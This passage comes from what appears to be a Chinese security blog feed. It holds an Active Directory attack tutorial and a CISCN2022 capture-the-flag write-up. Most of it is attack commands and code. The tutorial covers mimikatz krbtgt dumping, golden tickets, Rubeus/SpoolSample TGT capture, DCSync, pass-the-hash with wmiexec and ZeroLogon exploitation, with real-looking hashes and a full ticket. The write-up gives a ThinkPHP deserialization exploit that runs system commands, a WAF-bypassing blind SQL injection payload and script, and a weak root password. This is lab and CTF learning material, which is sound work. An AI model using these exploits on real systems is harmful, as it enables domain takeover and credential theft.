/ticket:sakura.kirbi&quot; #/ticket后面的含义是保存的文件名</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235022847.png" alt="image-20220711235022847"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235119876.png" alt="image-20220711235119876"></p><p>我们先看，目前是无法访问父域资源的</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235628387.png" alt="image-20220711235628387"></p><p><strong>TGS获取和利用</strong></p><pre><code>.\asktgs.exe C:\Users\Administrator\Desktop\sakura.kirbi CIFS/fy.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000226225.png" alt="image-20220712000226225"></p><pre><code class="shell">.\kirbikator.exe lsa .\CIFS.fy.sakura.com.kirbi</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000341715.png" alt="image-20220712000341715"></p><p>然后就可以成功对子域进行操作了</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000536307.png" alt="image-20220712000536307"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712001240811.png" alt="image-20220712001240811"></p><h4 id="利用krbtgt散列获取目标域权限"><a href="#利用krbtgt散列获取目标域权限" class="headerlink" title="利用krbtgt散列获取目标域权限"></a>利用krbtgt散列获取目标域权限</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712110239522.png" alt="image-20220712110239522"></p><p><strong>kebtgt散列获取</strong></p><pre><code class="shell">privilege::debuglsadump::lsa /patch /user:krbtgtsekurlsa::krbtgtexit</code></pre><p>或者直接合并成一句话</p><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:krbtgt&quot; &quot;sekurlsa::krbtgt&quot; &quot;exit&quot;</code></pre><p><strong>构造并注入黄金票据</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111832854.png" alt="image-20220712111832854"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /user:administrator /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /krbtgt:803b57a2a73cdc03133e631db7f506ad /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111644256.png" alt="image-20220712111644256"></p><h3 id="林信任攻击"><a href="#林信任攻击" class="headerlink" title="林信任攻击"></a>林信任攻击</h3><p>我这里设置两个域:</p><p>sakura.com、salmon.com</p><p>一台 ly-1 密码:yk2012.com</p><p>一台 ly-2 密码:yk-22012.com</p><h4 id="MS-RPPRN获取信任林权限"><a href="#MS-RPPRN获取信任林权限" class="headerlink" title="MS-RPPRN获取信任林权限"></a>MS-RPPRN获取信任林权限</h4><p><strong>利用条件</strong>:需要设置一台主机账户开启了非约束委派域内机器的权限，实际可配合powerview脚本查找主机，域控主机需要为win2012 server r2 以上 版本，Print Spooler服务默认是自动运行的</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712112745485.png" alt="image-20220712112745485"></p><p><strong>实验场景:</strong></p><ul><li>已获得一个林的权限(EA).。本例为sakura.com</li><li>配置了无约束委派的、已被攻击者控制的一台服务器(ly-1.sakura.com)</li><li>在演示案例中，攻击者入侵了根域的域控制器(DC),利用该DC攻击另一个域林中的另一个DC</li><li>目标域林:本例中为salmon.com</li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713162710957.png" alt="image-20220713162710957"></p><p><strong>攻击示意图</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150156656.png" alt="image-20220712150156656"></p><p><strong>利用工具</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150254348.png" alt="image-20220712150254348"></p><pre><code class="shell">.\Rubeus.exe monitor /interval:5 /filteruser:ly-2$</code></pre><p>interval参数用于设置监控的时间间隔，单位为秒；filteruser用于指定渗透测试中需要关注的用户</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160424988.png" alt="image-20220713160424988"></p><pre><code class="shell">.\SpoolSample.exe ly-2.salmon.com ly-1.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713155559395.png" alt="image-20220713155559395"></p><p>此时rubeus监听到了TGT</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160359007.png" alt="image-20220713160359007"></p><p>使用Rubeus工具直接把base64字符串导入票据：</p><pre><code class="shell">.\Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQwbClNBTE1PTi5DT02iHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbClNBTE1PTi5DT02jggPCMIIDvqADAgESoQMCAQKiggOwBIIDrBG1txlv0N5lRuOFLSbrz8uiCgjf4LwfNvlgi5p0Q80N4A9p301eRDthpV4Bwd7JCHjL7tQ/gZNU3cbA6PO3YCpg5AiVYcR7OnvfIU2LByxKN2iA4YMXRTIhFJZlRiuu4Wh2CQVbDHM+WR8rTHwnAetzq9uOkUrL7HiyK09IT1dmaQS5z7jm3WoRiSfqzfqrqpkrYUXHrKTNmeqdOxX9moYgpsFjKXwMZdHVcmnDLndt147OhMQfFOKwiVtN29YH/rvbmJnrYVLu6ZWZZpi7bj/bXY9pY8GeoNGxJMVZbiULiRnfToi0Db8DMpo115omCnsX7qfquZp5NmbyzO2/V1jknoUQ6k2qIvF+bvjydlh1PciiWxosTAMbD6bJMvwUUT78DZN6IRW9Dg0p3PgVexL73/BwCJ8f89cMzdXh7kZHm/ozhJI9uf1p0v9J2tu0g3flGDo+MF+VZBYBgVXNHiCM1oQGuEPI0Lx2Xs1JR5CCq4HdGh0tNgBIc7ppYg9W8S+6OfZU8dyQdtFh2Rc76CNHEipCzCZYBTctIJ5IV02oPzTM3lvQrbd2BsDBpWPqlV3u/7r5vm2ywp81yA2n7ZCYrZP+F9NP46IXIQ0hKT9VKoNf5ODqbH7H+0bfZogAMuMNN7Bs746NyC7qjhUbRWlmtRNfSlNqaHvsXdzcG7s87gTO9bS0v4Vxxf1ZFGnjsXfia/zvjIFymUdTJzak86FjyCj9HzxWmnSnImwT2WShnWex+S5PfOnuH7Mu8hSe/riKpdK1HdrRL3hBhhsT+vE3HNmLr7DIF0iZ5523Fibp0tOAgGf0LABdHa60anzlOSR5k2gWLSa4JifMxjohaQ5VUt3af6hewd67ZuTL9afVJyvYgAhjOsG7WEPJ1xgN3kOSp9KO+gZV7h9nKEeSScCaIDp5N29fU9CSxOzfQwct7i12BJwSGCK17S3M84v3DSXZWHmq891p2rw4Sr8BBEOE0FDfRhdnboNzkQ5Qf7CS2pafxLxtfQDiWKu2JQdRzNrLkb30zTBG4/uY/o9TBiN5mPSOPSjEqKVurkU3T0M1mYGaX9S0NdppQHKTMDEFdSMY58YzQ25PaEqMqUlvwI0V8c4cVRHsAtefz8GPfHS1I5ENB0OsSoRmWfel0T9/XX7gUjxgf4pQDYzLKb+WZm2fVMKVfB+U2kLcDC3oQ2wnRkmAYLYxJrKOVJRQVlPbIwhCsaP0JYX658qEA6BO9DjhJbz4jfXzOL+TH7ejgd0wgdqgAwIBAKKB0gSBz32BzDCByaCBxjCBwzCBwKArMCmgAwIBEqEiBCAsySonk73tkRU5Ja0UNRWW/zhAgUSZuBym4G3BFO7qKqEMGwpTQUxNT04uQ09NohIwEKADAgEBoQkwBxsFTFktMiSjBwMFAGChAAClERgPMjAyMjA3MTMwNzM0NDRaphEYDzIwMjIwNzEzMTczNDQ0WqcRGA8yMDIyMDcxMzE3MzQ0NFqoDBsKU0FMTU9OLkNPTakfMB2gAwIBAqEWMBQbBmtyYnRndBsKU0FMTU9OLkNPTQ==</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163130505.png" alt="image-20220713163130505"></p><pre><code class="shell">.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /user:krbtgt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163220750.png" alt="image-20220713163220750"></p><pre><code class="shell">.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::purge&quot; exit.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::golden /user:administrator /domain:salmon.com /sid:S-1-5-21-3200352805-2293635123-428118185 /rc4:8da01a075e60007f23b3ce18b77b9a0f /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713164513444.png" alt="image-20220713164513444"></p><p><strong>进一步利用，命令执行</strong></p><pre><code>.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /all /csv&quot; exit</code></pre><p>获得信息:</p><pre><code class="shell">1104    SAKURA$ 76771a6354707379eb4bfd77a28224e5        20801001    LY-2$   0d9a393377c2f46a3b2a20a95954e540        532480500     Administrator   8168027b15e25c5d6ad39528429229d6        512502     krbtgt  8da01a075e60007f23b3ce18b77b9a0f        514</code></pre><pre><code>python3 ./wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:8168027b15e25c5d6ad39528429229d6 ly-2.salmon.com/administrator@192.168.64.151</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713171855227.png" alt="image-20220713171855227"></p><h4 id="扩展-CVE-2020-1472-windows域控提权"><a href="#扩展-CVE-2020-1472-windows域控提权" class="headerlink" title="扩展 CVE-2020-1472 windows域控提权"></a>扩展 CVE-2020-1472 windows域控提权</h4><p>CVE-2020-1472 是⼀个 windows 域控中严重的远程权限提升漏洞，攻击者通过 NetLogon，建⽴与域控间易受攻击的安全通道时，可利⽤此漏洞获取域管访问权限（将域控中保存在AD中的管理员password设置为空）；其漏洞原理是发⽣在 RPC 认证过程的过程中，由于错误的使⽤了 AES-CFB8 加密所导致漏洞成因，该漏洞适⽤于 Win2008 后的所有版本</p><p>利用场景：获取了一个加入了域的计算机权限，在域普通账号的情况下，将域管密码置空，导出域管hash，然后进行连接 </p><p>ps：在实战环境中，由于会把域控机器的账户和密码清空，所以有可能会导致域内出问题，可能导致某些服务⽆法正常运⾏，严重会造成脱域等情况，请谨慎利⽤。</p><p>前置条件：目标域控存在此漏洞未打补丁，这个漏洞用到了MS-NRPC协议，用到了135端口</p><p>注意：在检测或者执行exp的时候，所在主机不一定加入域环境中，在涉及域解析的时候直接在hosts里面设置域名对应ip就行</p><p>复现步骤:</p><p>首先获取主机名:</p><pre><code class="shell">nbtstat -A 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713221143362.png" alt="image-20220713221143362"></p><p><strong>探测是否存在漏洞:</strong></p><p>链接:<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223158821.png" alt="image-20220713223158821"></p><p><strong>存在漏洞，下一步拿exp去打</strong></p><p>exp链接:<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><pre><code class="shell">python3 cve-2020-1472-exploit.py ly-1 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223643646.png" alt="image-20220713223643646"></p><p><strong>导出密码</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass &gt; ~/Desktop/pass.txt</code></pre><p>ps:kali $前要加个转义符号！</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230309872.png" alt="image-20220713230309872"></p><p><strong>连接上去</strong></p><pre><code class="shell">python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:07d312335be3ab7eceda2a6d341e5cbb ly-1.sakura.com/administrator@192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230637115.png" alt="image-20220713230637115"></p><p>成功连接</p><p><strong>恢复域控原始hash</strong></p><pre><code class="shell">reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.savelget system.savelget sam.savelget security.save</code></pre><p><strong>删除文件</strong></p><pre><code class="shell">del /f system.savedel /f sam.savedel /f security.save</code></pre><p><strong>通过 sam.save、security.save、system.save 这些⽂件获得原来域控机器上的 Ntlm Hash 值，⽤于恢复密码</strong></p><pre><code class="shell">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713234613032.png" alt="image-20220713234613032"></p><p><strong>通过拿到 $MACHINE.ACC: 的值，然后进⾏恢复</strong></p><p>脚本下载：<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py">https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py</a></p><p>使用方法:python reinstall_original_pw.py 域控机器名 域控ip $MACHINE.ACC后半部分的值</p><pre><code class="shell">python3 reinstall_original_pw.py ly-1 192.168.64.150 d6b706f6a4ea457327a4bfc1c4c642cb</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235319943.png" alt="image-20220713235319943"></p><p><strong>测试是否恢复成功</strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713235714975.png" alt="image-20220713235714975"></p><p>此时使用空密码去获取域内的所有用户的凭证已经不行了</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2022</title>
      <link href="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/"/>
      <url>/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到:"></a>签到:</h2><p>根据公众号给的提示，可构造出脚本</p><pre><code>a=&#39;5543053560369047024142002765898038342775948119489181360354534575324142175929505171739721800870791249314864251567972295612874802183218042622056229755674962381242884261754543945970151712920835729189983000341612995263262927255805323073625456260457938936828798227686401899839962031005363203251056213941366146686875718432385301325733733171999005964405664494560905422663352160064965067318132130228461655121372448333527884088007285116323305598946651171485490621766011242810388503390388653399069240050404600114824579296172741241184113479&#39;a=a[0:28]tmp=&#39;0&#39;b=&#39;1732251413440356045166710055&#39;for i in range(28):    print((ord(a[i])+ord(b[i])-2*ord(tmp[0]))%10,end=&quot;&quot;)</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121548778.png" alt="image-20220529121548778"></p><p>访问url:</p><p>xxx/send?msg=s</p><p>再访问</p><p>xxx/send?msg=6275204973709393069208712710</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121645372.png" alt="image-20220529121645372"></p><h2 id="基于挑战码的双向认证1"><a href="#基于挑战码的双向认证1" class="headerlink" title="基于挑战码的双向认证1"></a>基于挑战码的双向认证1</h2><h2 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h2><p>非预期解:</p><p>连接ssh</p><p>进入</p><p>/root/cube-shell/instance/flag_server 目录</p><p>两个flag全在里面</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529124444190.png" alt="image-20220529124444190"></p><h2 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h2><p>非预期</p><p>连接ssh</p><p>进入</p><p>/root/cube-shell/instance/flag_server 目录</p><p>su root</p><p>弱口令密码:toor</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529142614152.png" alt="image-20220529142614152"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>直接填问卷即可得到flag</p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><pre><code>tshark -T json -r ez_usb.pcapng &gt; data.json</code></pre><p>导出json数据</p><p>经过分析，它是有两个键盘流量。</p><p>分离一下</p><pre><code>import jsonjsonData=&quot;&quot;with open(&quot;data.json&quot;) as f:    text=f.read()    jsonData=json.loads(text)data_1=&quot;&quot;data_2=&quot;&quot;for i in jsonData:    try:        if i[&quot;_source&quot;][&quot;layers&quot;][&quot;usb&quot;][&quot;usb.src&quot;]==&quot;2.8.1&quot;:            data_1+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;        else:            data_2+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;    except:        passprint(data_1)print(data_2)</code></pre><p>分别保存为1.txt,2.txt</p><p>使用网上现成得脚本进行提取数据</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;1.txt&#39;) //2.txtfor line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529144605125.png" alt="image-20220529144605125"></p><p>发现是一个压缩包，第二个为密码</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145500226.png" alt="image-20220529145500226"></p><p>解开即可得到flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145515024.png" alt="image-20220529145515024"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>使用的</p><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p><p>exp:</p><pre><code class="php">&lt;?phpnamespace think&#123;    abstract class Model&#123;        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        function __construct($obj = &#39;&#39;)&#123;            $this-&gt;lazySave = True;            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;cat /flag.txt&#39;]];            $this-&gt;exists = True;            $this-&gt;table = $obj;            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];            $this-&gt;jsonAssoc = True;        &#125;    &#125;&#125;namespace think\model&#123;    use think\Model;    class Pivot extends Model&#123;    &#125;&#125;namespace&#123;    echo(urlencode((serialize(new think\model\Pivot(new think\model\Pivot())))));&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173238834.png" alt="image-20220529173238834"></p><p>ls / 查看</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173416181.png" alt="image-20220529173416181"></p><p>读flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529111702941.png" alt="image-20220529111702941"></p><h2 id="ezpentest"><a href="#ezpentest" class="headerlink" title="ezpentest"></a>ezpentest</h2><p>waf脚本如下:</p><pre><code class="php">&lt;?phpfunction safe($a) &#123;    $r = preg_replace(&#39;/[\s,()#;*~\-]/&#39;,&#39;&#39;,$a);    $r = preg_replace(&#39;/^.*(?=union|binary|regexp|rlike).*$/i&#39;,&#39;&#39;,$r);    return (string)$r;  &#125;?&gt;</code></pre><p>在比赛中是没有给出代码的</p><p>考察sql注入，和2022虎符babysql很相似。</p><p>可利用case when注入，可构造出payload</p><pre><code>0&#39;||case&#39;1&#39;when`password`collate&#39;utf8mb4_bin&#39;like&#39;&#123;&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;</code></pre><p>过滤了取反导致不能利用<del>0+1来制造溢出,但是我们可以利用 18446744073709551615+1(它就代表</del>0+1)来制造出溢出，当匹配到正确字符时，服务器会报500，否则就返回’0’，服务器会报error。或者用9223372036854775807+1也行</p><p>由此可构造出脚本:</p><pre><code class="python">import requestsimport stringurl = &#39;http://1.14.71.254:28470/login.php&#39;result = &#39;&#39;ceshi = &#39;&#39;lis = string.ascii_letters + string.digits + &quot;^!%@_$%*&quot;gl = &quot;%*()_&quot;while 1:    for i in lis:            if i in gl:  # 这里是对like正则匹配中的一些特殊符号进行转义                i = &quot;\\&quot; + i            ceshi = result + i            payload = &quot;0&#39;||case&#39;1&#39;when`username`collate&#39;utf8mb4_bin&#39;like&#39;&#123;0&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;&quot;.format(ceshi)            #print(payload)            #username 改为 password即可得到密码            data = &#123;                &quot;username&quot;: &quot;666&quot;,                